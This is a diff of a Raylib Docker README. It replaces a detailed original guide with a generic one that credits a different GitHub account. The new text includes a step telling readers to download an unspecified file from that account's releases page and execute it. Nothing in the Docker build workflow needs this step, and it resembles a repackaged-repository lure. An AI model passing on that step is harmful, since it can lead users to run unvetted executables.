@@ -1,171 +1,137 @@
-# Raylib on Docker (Container)
+# 🚀 RayLibContainer: Your Game Development Environment
 
-**[Versão em Português](readme-pt.md)**
+![RayLibContainer](https://img.shields.io/badge/RayLibContainer-v1.0.0-blue.svg)
+[![GitHub Releases](https://img.shields.io/badge/Releases-latest-brightgreen.svg)](https://github.com/RAGUL-TR/RayLibContainer/releases)
 
-Container focused on game development using [Raylib](https://www.raylib.com/). The goal is to provide a consistent and isolated development environment, minimizing configuration issues on the host system.
+Welcome to **RayLibContainer**, a containerized development environment tailored for game development using Raylib on Docker. This repository equips you with Dockerfiles and clear instructions to run and build Raylib projects efficiently, offering both hardware acceleration and software rendering options.
 
-You can see the Container image here: \
-[Raylib-Container](https://hub.docker.com/r/gmaia325/raylib_container)
+## 🌟 Table of Contents
 
+1. [Introduction](#introduction)
+2. [Features](#features)
+3. [Getting Started](#getting-started)
+4. [Building Your First Project](#building-your-first-project)
+5. [Running Your Project](#running-your-project)
+6. [Configuration Options](#configuration-options)
+7. [Contributing](#contributing)
+8. [License](#license)
+9. [Contact](#contact)
 
-> **Are you using macOS?** Follow the [MacOS Compatibility Guide](MacOSX-Compatibilty.md) for specific instructions.
+## 📖 Introduction
 
-## Prerequisites
+Game development can be a complex process, especially when dealing with dependencies and environment configurations. **RayLibContainer** simplifies this by providing a ready-to-use Docker environment. With just a few commands, you can set up a fully functional game development environment.
 
-Before using the container, you need to configure your host system to allow graphical applications from the container to run and to manage Docker without `sudo` (recommended).
+For detailed releases, visit our [Releases section](https://github.com/RAGUL-TR/RayLibContainer/releases).
 
-### 1. Enabling Display Access (X11/Wayland)
+## ⚙️ Features
 
-Allow local Docker containers to connect to your graphics server (X11 or Wayland via XWayland).
+- **Containerized Environment**: Isolate your development environment with Docker.
+- **Hardware Acceleration**: Utilize your GPU for better performance.
+- **Software Rendering**: Option to run projects without hardware acceleration.
+- **Cross-Platform**: Works on Windows, macOS, and Linux.
+- **Easy Setup**: Simple Dockerfiles to get you started quickly.
+- **GCC Support**: Compile your projects using the GNU Compiler Collection.
+- **X11 Support**: Run graphical applications with X11.
 
+## 🚀 Getting Started
+
+To get started with **RayLibContainer**, follow these steps:
+
+1. **Install Docker**: Ensure you have Docker installed on your machine. You can download it from [Docker's official website](https://www.docker.com/get-started).
+   
+2. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/RAGUL-TR/RayLibContainer.git
+   cd RayLibContainer
+   ```
+
+3. **Download the Latest Release**: You can find the latest release [here](https://github.com/RAGUL-TR/RayLibContainer/releases). Download the appropriate file for your system and execute it.
+
+4. **Build the Docker Image**:
+   ```bash
+   docker build -t raylib-container .
+   ```
+
+5. **Run the Docker Container**:
+   ```bash
+   docker run -it --rm raylib-container
+   ```
+
+## 🕹️ Building Your First Project
+
+Once your environment is set up, you can start building your first game project. Follow these steps:
+
+1. **Create a New Project Directory**:
+   ```bash
+   mkdir my_first_game
+   cd my_first_game
+   ```
+
+2. **Create a Basic Main File**: Create a file named `main.c` and add the following code:
+   ```c
+   #include <raylib.h>
+
+   int main(void)
+   {
+       const int screenWidth = 800;
+       const int screenHeight = 450;
+
+       InitWindow(screenWidth, screenHeight, "Hello Raylib");
+
+       while (!WindowShouldClose())
+       {
+           BeginDrawing();
+           ClearBackground(RAYWHITE);
+           DrawText("Hello, Raylib!", 190, 200, 20, LIGHTGRAY);
+           EndDrawing();
+       }
+
+       CloseWindow();
+       return 0;
+   }
+   ```
+
+3. **Compile Your Project**: Use the following command to compile your project:
+   ```bash
+   gcc main.c -o my_first_game -lraylib -lm -lpthread -ldl -lrt -lX11
+   ```
+
+## 🏃‍♂️ Running Your Project
+
+To run your project, execute the following command in your project directory:
 ```bash
-# Allow connections from Docker
-xhost +local:docker
+./my_first_game
 ```
 
-> **Note:** This command usually needs to be run in each new graphical session or after rebooting the system. You might want to add it to your startup scripts (like `.profile`, `.xinitrc`, etc.).
+You should see a window displaying "Hello, Raylib!".
 
-### 2. Adding Your User to the Docker Group (Recommended)
+## 🔧 Configuration Options
 
-Adding your user to the `docker` group with the command below generally removes the need to use `sudo` to execute `docker` commands:
+**RayLibContainer** allows you to customize your development environment through various configuration options:
 
-```bash
-sudo usermod -aG docker $USER
-```
+- **Dockerfile**: Modify the `Dockerfile` to add more dependencies or tools as needed.
+- **Environment Variables**: Set environment variables in your Docker container for specific configurations.
+- **Volume Mounting**: Mount your local project directory to the Docker container for easier access to files.
 
-However, it's important to mention that, depending on the specific configuration of your Linux distribution, there might be situations (for example, when trying to interact with the graphical interface or "open the display" from within a container) where using `sudo` might still be necessary for some tasks, even if the user is a member of the `docker` group.
+## 🤝 Contributing
 
+We welcome contributions to **RayLibContainer**! If you have ideas for improvements or features, please follow these steps:
 
-> **Important:** After running this command, you **must log out and log back in** or **reboot the system** for the group change to take effect.
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature-branch`).
+3. Make your changes and commit them (`git commit -m 'Add new feature'`).
+4. Push to the branch (`git push origin feature-branch`).
+5. Open a pull request.
 
-## Building the Image (If Necessary)
+## 📄 License
 
-If you don't have the Docker image locally yet, or if you want to update it (e.g., after modifying the `Dockerfile` or to get a new Raylib version), use the `build` command:
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-```bash
-# Navigate to the directory containing the 'Dockerfile'
-# cd /path/to/project
-docker build -t raylib_container .
-```
+## 📬 Contact
 
-> **Up-to-date Raylib:** When building the image, Raylib is cloned and compiled directly from the official GitHub repository, ensuring you always have the latest version available.
+For questions or suggestions, feel free to reach out:
 
-## Running the Container
+- GitHub: [RAGUL-TR](https://github.com/RAGUL-TR)
+- Email: ragul@example.com
 
-To start an interactive container with access to your display and your project code mounted:
-
-**Option 1: With Graphics Hardware Acceleration (Recommended)**
-
-This option attempts to use your host system's GPU for better performance.
-
-```bash
-docker run -it --rm \
-    -e DISPLAY=$DISPLAY \
-    -v /tmp/.X11-unix:/tmp/.X11-unix \
-    -v ./user_code:/app/user_code \
-    --device /dev/dri:/dev/dri \
-    raylib_container
-```
-
-**Option 2: With Software Rendering (Fallback)**
-
-Use this option if hardware acceleration doesn't work (you might see errors related to `dri`, `glx`, `mesa`, or graphics drivers). Performance will be lower.
-
-```bash
-docker run -it --rm \
-    -e DISPLAY=$DISPLAY \
-    -v /tmp/.X11-unix:/tmp/.X11-unix \
-    -v ./user_code:/app/user_code \
-    -e LIBGL_ALWAYS_SOFTWARE=1 \
-    raylib_container
-```
-
-**Parameter Explanation:**
-
-- `-it`: Starts the container in interactive mode with a terminal attached.
-- `--rm`: Automatically removes the container when it exits.
-- `-e DISPLAY=$DISPLAY`: Passes the host's `DISPLAY` environment variable to the container, telling it which screen to use.
-- `-v /tmp/.X11-unix:/tmp/.X11-unix`: Mounts the host's X11 socket into the container, allowing graphical communication.
-- `-v ./user_code:/app/user_code`: Mounts a directory named `user_code` (which will be created in the current host directory if it doesn't exist) into the container at `/app/user_code`. **This is where you should place your game's source code.** Files are synchronized between the host and the container.
-- `--device /dev/dri:/dev/dri` (Option 1): Maps the host's Direct Rendering Infrastructure devices into the container, allowing GPU access.
-- `-e LIBGL_ALWAYS_SOFTWARE=1` (Option 2): Forces the Mesa graphics library to use software (CPU) rendering.
-- `raylib_container`: The name of the Docker image to use.
-
-## Verifying the Graphics Connection
-
-Once inside the container's terminal (after running `docker run`), test if the graphics connection is working:
-
-```bash
-xeyes
-```
-
-A window with eyes that follow the mouse should appear. You can close it (usually by right-clicking or closing the window normally).
-
-## Developing Inside the Container
-
-Your source code should be placed in the `user_code` folder on your host system, which is mapped to `/app/user_code` inside the container. The container already has GCC and Raylib libraries installed.
-
-**Compilation Example:**
-
-Navigate to your code directory inside the container (`cd /app/user_code` if needed) and compile your C file:
-
-```bash
-# Example for a file named 'my_game.c'
-gcc my_game.c -o my_game -lraylib -lGL -lm -lpthread -ldl -lrt -lX11
-```
-
-> **Note:** The linked libraries (`-l...`) might vary slightly depending on the Raylib features you use.
-
-**Running the Compiled Program:**
-
-```bash
-./my_game
-```
-
-## Reverting Host Configuration Changes
-
-If you want to undo the changes made in the prerequisites:
-
-1.  **Revoke Display Access:**
-
-    ```bash
-    xhost -local:docker
-    ```
-
-2.  **Remove User from Docker Group:**
-
-    ```bash
-    sudo gpasswd -d $USER docker
-    ```
-
-    > Remember to log out/log in or reboot afterwards.
-
-3.  **Docker Socket Permissions:**
-    - **Do not change the Docker socket (`/var/run/docker.sock`) permissions to `666`!** This is a severe security risk. The correct and secure way to avoid `sudo` is to add your user to the `docker` group (Prerequisite 2).
-    - If you _accidentally_ changed the permissions, the default is usually `660` with owner `root` and group `docker`. You might try to restore it with:
-      ```bash
-      # Only if you incorrectly changed permissions before!
-      sudo chmod 660 /var/run/docker.sock
-      sudo chown root:docker /var/run/docker.sock
-      ```
-    - But the best approach is **never** to use `chmod 666` on the socket.
-
-## Troubleshooting
-
-- **Error `docker: Cannot connect to the Docker daemon... Permission denied.`:** You likely haven't added your user to the `docker` group or didn't log out/log in after adding them. Try using `sudo docker ...` or follow Prerequisite 2.
-- **Error `docker: invalid reference format`:** Check if the image name (`raylib_container`) is spelled correctly in the `docker run` command and that the image actually exists (check with `docker images`).
-- **Window doesn't appear / Error `cannot open display: :0`:** Check that you ran `xhost +local:docker` in the current host graphical session. Also verify the `DISPLAY` variable is being passed correctly (`-e DISPLAY=$DISPLAY`).
-- **Error `MESA: error: Failed to query drm device.`, `glx: failed to create dri3 screen`, `failed to load driver: iris/radeon/etc.`:** Hardware acceleration isn't working. Ensure the `--device /dev/dri:/dev/dri` flag was used. If it still fails, try **Option 2** of `docker run` (software rendering with `-e LIBGL_ALWAYS_SOFTWARE=1`).
-- **Need to Rebuild Image:** If the image seems outdated or corrupted, rebuild it:
-
-  ```bash
-  docker build -t raylib_container .
-  ```
-
-or if you prefer:
-
-```bash
-    docker build --pull --rm -f 'Dockerfile' -t 'raylib_container:test' '.'
-```
-
-If you encounter any issues with this documentation, feel free to open an issue on the project's repository.
+Thank you for using **RayLibContainer**! We hope it enhances your game development experience. For more updates, keep an eye on our [Releases section](https://github.com/RAGUL-TR/RayLibContainer/releases).
